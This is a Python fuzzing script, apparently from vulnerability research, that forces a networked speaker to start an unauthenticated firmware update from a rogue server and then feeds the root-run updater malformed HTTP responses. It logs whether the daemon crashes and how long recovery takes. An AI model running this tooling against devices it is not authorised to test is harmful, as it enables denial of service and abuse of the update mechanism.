#!/usr/bin/env python3
"""Mutate the updater's *HTTP response* while it fetches the image URL.

The device runs `wget -qC <url> -T 300 -O -` as root; the URL comes from an
edited manifest's base_url. Every mode serves the stock image bytes but with a
different response frame, so the file content is irrelevant.

Usage:
  python3 update_http_fuzz.py serve --mode MODE [--port 8895]
  python3 update_http_fuzz.py trigger <player-ip> [--port 8895] [--host IP]
  python3 update_http_fuzz.py run <player-ip> [--port 8895] [--host IP]

`serve` writes one JSON line per request plus a summary per mode to
`captures/research/upd_http_<mode>_<ts>.jsonl` (stdout with --stdout).
The metrics are bytes written before the client closed, the abort stage
(headers/body/complete), and the daemon-down and recovery times.
"""
import argparse, json, os, socket, struct, sys, threading, time, urllib.request, urllib.error

ROOT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..")
IMAGE = os.path.join(ROOT, "captures", "firmware", "57.23-74170-1-16.upd")
MANIFEST = os.path.join(ROOT, "captures", "firmware", "manifest_9901.upm")
CHUNK = 16384

MODES = ("control", "chunk0", "chunk1", "chunkmax", "chunkneg", "chunkgarbage",
         "redir1", "redir10", "redir100", "loc4k", "500hdr", "hdr4k", "hdr64k",
         "status1m")


def manifest(host, port):
    text = open(MANIFEST, encoding="latin1").read()
    # replace whatever base_url is there with ours
    out = []
    for line in text.splitlines(True):
        if "base_url=" in line:
            out.append('                 base_url="http://%s:%d/^99.0-1"\n' % (host, port))
        elif "<image model=\"16\"" in line:
            out.append('<image model="16" version="99.0.1" flags="0x6">'
                       'http://%s:%d/^99.0-1</image>\n' % (host, port))
        else:
            out.append(line)
    return "".join(out).replace('system_version="99.0-1"',
                                'system_version="99.0.1"').encode("latin1")


class Sink:
    """One accepted connection; counts bytes actually written."""

    def __init__(self, c, log):
        self.c, self.log, self.sent, self.aborted = c, log, 0, None

    def write(self, b):
        try:
            self.c.sendall(b)
            self.sent += len(b)
            return True
        except (BrokenPipeError, ConnectionResetError) as e:
            self.aborted = self.aborted or type(e).__name__
            return False


def chunked(s, data):
    """Chunked with a deliberately broken first size."""
    mode = s.mode
    if mode == "chunk0":
        s.write(b"0\r\n\r\n")
        s.write(data)                      # raw tail, no chunk frames
    elif mode == "chunk1":
        s.write(b"1\r\n" + data[:1] + b"\r\n")
        rest = data[1:]
        for i in range(0, len(rest), CHUNK):
            part = rest[i:i + CHUNK]
            if not s.write(("%x\r\n" % len(part)).encode() + part + b"\r\n"):
                return
        s.write(b"0\r\n\r\n")
    elif mode == "chunkmax":
        s.write(b"ffffffff\r\n" + data)    # no terminator: huge first chunk
    elif mode == "chunkneg":
        s.write(b"-1\r\n" + data)
    elif mode == "chunkgarbage":
        s.write(b"ZZZ\r\n" + data)


def handle(c, addr, state):
    t0 = time.time()
    c.settimeout(30)
    buf = b""
    try:
        while b"\r\n\r\n" not in buf:
            b = c.recv(4096)
            if not b:
                return
            buf += b
        head = buf.split(b"\r\n\r\n", 1)[0].decode("latin1", "replace")
        lines = head.split("\r\n")
        method, path, _ = (lines[0].split(" ") + ["", "", ""])[:3]
        hdrs = {}
        for ln in lines[1:]:
            if ":" in ln:
                k, v = ln.split(":", 1)
                hdrs[k.strip().lower()] = v.strip()
        path = path.split("?")[0]
        s = Sink(c, state)
        s.mode = state["mode"]
        state["requests"] += 1
        state["last"] = {"mode": s.mode, "path": path, "method": method,
                         "range": hdrs.get("range"), "ua": hdrs.get("user-agent"), "t": t0}

        if path == "/update.upm":
            body = state["manifest"]
            hdr = (b"HTTP/1.1 200 OK\r\nServer: CloudFront\r\n"
                   b"Content-Type: application/xml\r\nContent-Length: %d\r\n"
                   b"Connection: close\r\n\r\n" % len(body))
            s.write(hdr); s.write(body)
        elif s.mode in ("redir1", "redir10", "redir100"):
            n = int(s.mode[5:])
            hops = int(hdrs.get("x-hop", "0").split(";")[0]) if "x-hop" in hdrs else 0
            # encode the hop number in the path: /r<N>
            hops = int(path[2:]) if path.startswith("/r") else 0
            if hops < n:
                loc = "/r%d" % (hops + 1)
                hdr = ("HTTP/1.1 302 Found\r\nLocation: %s\r\nContent-Length: 0\r\n"
                       "Connection: close\r\n\r\n" % loc).encode()
                s.write(hdr)
            else:
                body_resp(s, state)
        elif s.mode == "loc4k" and not path.startswith("/aaa"):
            loc = "/" + "a" * 4096
            s.write(("HTTP/1.1 302 Found\r\nLocation: %s\r\nContent-Length: 0\r\n"
                     "Connection: close\r\n\r\n" % loc).encode())
        elif s.mode == "500hdr":
            body = state["body"]
            hdr = (b"HTTP/1.1 500 Internal Server Error\r\nServer: CloudFront\r\n"
                   b"Content-Type: application/octet-stream\r\n"
                   b"Content-Length: %d\r\nConnection: close\r\n\r\n" % len(body))
            s.write(hdr); s.write(body)
        else:
            body_resp(s, state)
    except (BrokenPipeError, ConnectionResetError) as e:
        try: s.aborted = s.aborted or type(e).__name__
        except NameError: pass
    except Exception as e:
        sys.stderr.write("handler: %r\n" % (e,))
    finally:
        rec = {"t": round(t0, 3), "sent": getattr(locals().get("s"), "sent", 0),
               "aborted": getattr(locals().get("s"), "aborted", None),
               "path": locals().get("path"), "mode": state["mode"]}
        state["log"].write(json.dumps(rec) + "\n"); state["log"].flush()
        try: c.close()
        except Exception: pass


def body_resp(s, state):
    body = state["body"]
    if s.mode.startswith("chunk"):
        hdr = (b"HTTP/1.1 200 OK\r\nServer: CloudFront\r\n"
               b"Content-Type: application/octet-stream\r\n"
               b"Transfer-Encoding: chunked\r\nConnection: close\r\n\r\n")
        if not s.write(hdr):
            return
        chunked(s, body)
        return
    extra = b""
    if s.mode in ("hdr4k", "hdr64k"):
        n = 4096 if s.mode == "hdr4k" else 65536
        extra = b"X-Junk: " + b"A" * n + b"\r\n"
    if s.mode == "status1m":
        if not s.write(b"HTTP/1.1 200 "):
            return
        for _ in range(16):
            if not s.write(b"S" * 65536):
                return
        if not s.write(b"\r\n"):
            return
    else:
        if not s.write(b"HTTP/1.1 200 OK\r\n"):
            return
    hdr = (b"Server: CloudFront\r\n"
           b"Content-Type: application/octet-stream\r\n" + extra +
           b"Content-Length: %d\r\nConnection: close\r\n\r\n" % len(body))
    if not s.write(hdr):
        return
    for i in range(0, len(body), CHUNK):
        if not s.write(body[i:i + CHUNK]):
            return


def serve(args):
    state = {"mode": args.mode, "requests": 0, "body": open(IMAGE, "rb").read(),
             "manifest": manifest(args.host or "192.168.4.170", args.port),
             "log": open(args.log, "w")}
    srv = socket.socket()
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", args.port)); srv.listen(16)
    print("serving %s on %d; image %d bytes" % (args.mode, args.port, len(state["body"])), flush=True)
    while True:
        c, a = srv.accept()
        threading.Thread(target=handle, args=(c, a, state), daemon=True).start()


def poll(ip, seconds):
    up = down_at = None
    t0 = time.time()
    while time.time() - t0 < seconds:
        try:
            urllib.request.urlopen("http://%s:1400/status/VERSION" % ip, timeout=2).read()
            if down_at is not None and up is None:
                up = time.time() - t0
                break
        except Exception:
            if down_at is None:
                down_at = time.time() - t0
        time.sleep(1)
    return down_at, up


def trigger(ip, host, port, path="update.upd"):
    url = "http://%s:%d/%s" % (host, port, path)
    body = ('<?xml version="1.0"?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" '
            's:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><s:Body>'
            '<u:BeginSoftwareUpdate xmlns:u="urn:schemas-upnp-org:service:ZoneGroupTopology:1">'
            '<Flags>1</Flags><UpdateURL>%s</UpdateURL></u:BeginSoftwareUpdate></s:Body></s:Envelope>' % url).encode()
    req = urllib.request.Request("http://%s:1400/ZoneGroupTopology/Control" % ip, data=body,
                                 headers={"SOAPACTION":
                                          '"urn:schemas-upnp-org:service:ZoneGroupTopology:1#BeginSoftwareUpdate"',
                                          "Content-Type": "text/xml; charset=utf-8"})
    try:
        r = urllib.request.urlopen(req, timeout=15)
        return r.status, r.read(200).decode("latin1", "replace")[:120]
    except urllib.error.HTTPError as e:
        return e.code, e.read(200).decode("latin1", "replace")[:120]
    except Exception as e:
        return type(e).__name__, str(e)[:80]


def run(args):
    for mode in (args.modes or MODES):
        logpath = os.path.join(ROOT, "captures", "research",
                               "upd_http_%s_%d.jsonl" % (mode, int(time.time())))
        import subprocess
        srv = subprocess.Popen([sys.executable, os.path.abspath(__file__), "serve",
                                "--mode", mode, "--port", str(args.port),
                                "--host", args.host, "--log", logpath],
                               stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
        try:
            time.sleep(0.7)
            st = txt = None
            for attempt in range(3):
                for _ in range(40):
                    try:
                        st, txt = trigger(args.ip, args.host, args.port, args.path)
                        break
                    except Exception:
                        time.sleep(2)
                # give it 10 s to produce a request before re-firing
                for _ in range(10):
                    time.sleep(1)
                    if sum(1 for _ in open(logpath)) >= 2:
                        break
                else:
                    if attempt < 2:
                        continue
                    break
                break
            down_at, up = poll(args.ip, args.timeout)
            frame = {}
            try: frame = json.loads(open(logpath).read().splitlines()[-1])
            except Exception: pass
            print(json.dumps({"mode": mode, "trigger": st, "reply": txt,
                              "requests": sum(1 for _ in open(logpath)),
                              "bytes": frame.get("sent"), "aborted": frame.get("aborted"),
                              "down_s": None if down_at is None else round(down_at, 1),
                              "up_s": None if up is None else round(up, 1)}), flush=True)
        finally:
            srv.terminate(); srv.wait()


if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    sub = ap.add_subparsers(dest="cmd", required=True)
    sp = sub.add_parser("serve"); sp.add_argument("--mode", required=True); sp.add_argument("--port", type=int, default=8895)
    sp.add_argument("--host", default="192.168.4.170"); sp.add_argument("--log", default="/tmp/upd_http.jsonl")
    tp = sub.add_parser("trigger"); tp.add_argument("ip"); tp.add_argument("--host", default="192.168.4.170")
    tp.add_argument("--port", type=int, default=8895); tp.add_argument("--path", default="update.upd")
    rp = sub.add_parser("run"); rp.add_argument("ip"); rp.add_argument("--host", default="192.168.4.170")
    rp.add_argument("--port", type=int, default=8895); rp.add_argument("--timeout", type=float, default=240)
    rp.add_argument("--path", default="update.upd")
    rp.add_argument("modes", nargs="*")
    a = ap.parse_args()
    if a.cmd == "serve": serve(a)
    elif a.cmd == "trigger": print(trigger(a.ip, a.host, a.port, a.path))
    else: run(a)
